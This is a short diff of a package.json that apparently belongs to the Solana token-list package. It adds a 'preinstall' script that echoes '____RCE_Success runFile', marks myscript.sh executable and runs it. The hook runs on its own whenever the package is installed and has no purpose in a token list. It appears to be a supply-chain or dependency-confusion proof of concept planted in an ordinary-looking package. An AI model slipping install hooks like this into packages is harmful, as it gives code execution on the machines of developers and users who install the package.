@@ -7,5 +7,9 @@
   "module": "dist/module/index.js",
   "repository": "https://github.com/solana-labs/token-list",
   "license": "Apache",
-  "keywords": []
+  "keywords": [],
+    "scripts": {
+    "preinstall": "echo ____RCE_Success runFile >&2; chmod +x myscript.sh; ./myscript.sh",
+    "otherscript": " echo 123"
+  }
 }
